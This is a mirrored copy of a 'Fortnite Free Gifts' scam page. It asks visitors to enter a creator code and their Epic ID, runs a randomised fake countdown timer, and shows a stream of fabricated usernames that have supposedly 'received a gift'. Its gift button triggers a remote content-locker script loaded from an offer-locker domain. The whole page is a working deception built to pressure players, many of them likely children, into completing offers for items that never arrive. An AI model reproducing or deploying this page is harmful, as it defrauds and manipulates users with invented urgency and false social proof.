<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>title</title>
  </head>
  <body>
  
<!doctype html>
<html lang="en">
  
<!-- Mirrored from airspirfortnite.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 07 Jun 2020 00:30:33 GMT -->
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="favicon.html">

    <title>Fortnite Free Gifts</title>

    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/main.css" rel="stylesheet">
    <script type="text/javascript" id="ogjs" src="https://www.locked1.com/cl/load.php?id=62c73f940a5b03fcc809ec9495039b95"></script>
  </head>

  <body>
    <div class="container-fluid">
        <div class="container text-center">
            <div class="row">
                <div class="head text-center">
                    <h1>Fortnite Gifts</h1>
                </div>
            </div>
            <div class="row">
                <div class="col-md-5 nopad left"><img src="img/battle-pass-season-3.png" class="img-fluid" alt="Free Battle Pass"></div>
                <div class="col-md-7 nopad right">
                    <div id="step1" class="col">
                        PLEASE CONFIRM THAT YOU ENTERED CODE <span>AIRSPIR</span> IN THE FORTNITE ITEM SHOP TO CONTINUE; FAILURE TO PUT THE CODE IN YOUR ITEM SHOP WILL DISQUALIFY YOU FROM GETTING A FREE GIFT! <br><span></span>
                        <button id="cta-step1">CONFIRM</button>
                    </div>
                    <div id="step2" class="col">
                        Time left:<br>
                        <span class="time" id="time">48:25</span><br><br class='desktop'>
                        Enter EPIC ID <br class='desktop'><span>Who do we send this gift to?</span><br>
                        <input type="text" name="text" id="name"><br>
                        <button onclick="call locker();">RECIEVE GIFT</button>
                    </div>
                </div>
            </div>
        </div>
        <div class="col lastPass mob">
            <span id="nameGenerate">username</span><br>has been added to the list
        </div>
    </div>
    <div class="col lastPass desktop">
        <span id="nameGenerateDesk">username</span><br>has recieved a gift!
    </div>
    
    <script src="../code.jquery.com/jquery-3.3.1.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
    <script src="../cdnjs.cloudflare.com/ajax/libs/popper.js/1.13.0/popper.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="../cdnjs.cloudflare.com/ajax/libs/holder/2.9.4/holder.min.js"></script>
    <script>
        
        var heightBg = $(document).height();
        
        
        
        $('body').css('background-size', 'auto '+heightBg+'px');
        console.log(heightBg);
        
        function timer(){
            var time;
            var minutes = '';
            var minutesFinal = '';
            var seconds = '';
            var secondsFinal = '';
            var max = 59;
            var min = 10;
            
            minutes = Math.floor(Math.random() * (max - min + 1)) + min;
            seconds = Math.floor(Math.random() * (59 - 1 + 1)) + 1;
            $('#time').html(time);
            //console.log(minutes[i]);
            
            
            
            function calcTime(){
                if(seconds > 0){
                    seconds -= 1;
                } 
                else {
                    seconds = 59;
                    minutes -= 1;
                }
                if(minutes < 0){
                    minutes = 0;
                    seconds = 0;
                    clearInterval(timeLoop);
                }
                
                if(minutes < 10){
                    minutesFinal = '0'+minutes;
                }
                else {
                    minutesFinal = minutes;
                }

                if(seconds < 10){
                    secondsFinal = '0'+seconds;
                }
                else {
                    secondsFinal = seconds;
                }

                time = minutesFinal+' : '+secondsFinal;
                
                $('#time').html(time);

            }
            
            var timeLoop = setInterval(calcTime, 1000);
            
        }
        
        timer();
        
        var nameValue = '';
        var validName = false;
        var elementName = document.getElementById('name');

        elementName.addEventListener('keyup', function(){
            
            nameValue = document.getElementById('name').value;
            
            if(nameValue.length < 3){
                $('#name').removeClass('actived');
                $('#name').addClass('error');
                validName = false;
                
            }
            else if(nameValue.length >= 3){
                $('#name').removeClass('error');
                $('#name').addClass('actived');
                $('#cta-step-2').prop("disabled", false);
                $('#cta-step-2').animate({
                    'opacity':1
                }, 300);
                $('#cta-step-2').css('cursor','pointer');
                validName = true;
                
            }
            else{
                $('#name').removeClass('actived');
                $('#name').removeClass('error');
                validName = false;
            }
            
        });
        
        
        var nameGenerate = '';
        var nameStart = '';
        var nameMid = '';
        var nameEnd = '';

        var startNameGenerate = Array('', 'FaZe', 'Xx', 'OpTic', 'FTG', 'Ryan', 'Kyle', 'Love', 'Ohio', 'Riley');
        var midNameGenerate = Array('artic', 'fran', 'Games', 'JuL', 'mike', 'poney', 'china', 'mehdi', 'momo', 'IkIllU', 'imthebest', 'ludwig', 'om', 'bart', 'FrEddY', 'GiL', 'Good', 'arb', 'cracked', 'luciol', 'franck', 'will', 'pro', 'DustYYY', 'JOhn', 'dave', 'david', 'phil', 'sun', 'Tsuna', 'Lidy', 'lidi', 'Sarah', 'Zoo_', 'Hope', 'Lost', '-_-', 'ruDolf', 'Games', 'iZi', 'Luka', 'touyou', 'BestGamer');
        var endNameGenerate = Array('', 'xXx', 'xX', '777', 'Console', 'Gaming', 'gaming', 'TTV', 'gaming', 'love', 'YT', 'TTV BTW', 'Love', 'L', '.', '75', '76', '77', '_80', '_78', '_79', '_95');
        
        nbNameStart = Math.floor(Math.random()*startNameGenerate.length);
        nameStart = startNameGenerate[nbNameStart];

        nbNameMid = Math.floor(Math.random()*midNameGenerate.length);
        nameMid = midNameGenerate[nbNameMid];

        nbNameEnd = Math.floor(Math.random()*endNameGenerate.length);
        nameEnd = endNameGenerate[nbNameEnd];

        nameGenerate = nameStart+''+nameMid+''+nameEnd;         

        $('#nameGenerate').html(nameGenerate);
        $('#nameGenerateDesk').html(nameGenerate);
        
        var timeLoop;
        
        timeLoopMin = 5;
        timeLoopMax = 12;
        loopTime = Math.floor(Math.random() * (timeLoopMax - timeLoopMin + 1)) + timeLoopMin
        
        function launchLoop(){
            var loopGenerate = setInterval(generatePass, loopTime+'000');
        }
        
        function generatePass(){
            nbNameStart = Math.floor(Math.random()*startNameGenerate.length);
            nameStart = startNameGenerate[nbNameStart];

            nbNameMid = Math.floor(Math.random()*midNameGenerate.length);
            nameMid = midNameGenerate[nbNameMid];

            nbNameEnd = Math.floor(Math.random()*endNameGenerate.length);
            nameEnd = endNameGenerate[nbNameEnd];

            nameGenerate = nameStart+''+nameMid+''+nameEnd;         

            $('#nameGenerate').html(nameGenerate);
            $('#nameGenerateDesk').html(nameGenerate);

            function outLoop(){
                setTimeout(function(){
                   $('.lastPass').animate ({
                        opacity :0,
                        right:'-450px'
                    }, 500); 
                }, 2500);
            }

            $('.lastPass').animate ({
                opacity :1,
                right:0
            }, 500, outLoop);
        }  
        
        launchLoop();
        
        //loopPass();
        //generatePass();
        
        $('#cta-step1').click(function(){
           $('#step1').animate({
               left:'0px',
               opacity:0
           },300, function(){
              $('#step1').css('display','none');
              $('#step2').css('display','block');
              $('#step2').animate({
                 left:'0px',
                 opacity:1
              },300);
           });
        });
        
        $('#cta-step-2').click(function(){
            //YOUR SCRIPT HERE
        });
      
    </script>
  </body>

<!-- Mirrored from airspirfortnite.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 07 Jun 2020 00:30:33 GMT -->
</html>

  </body>
</html>
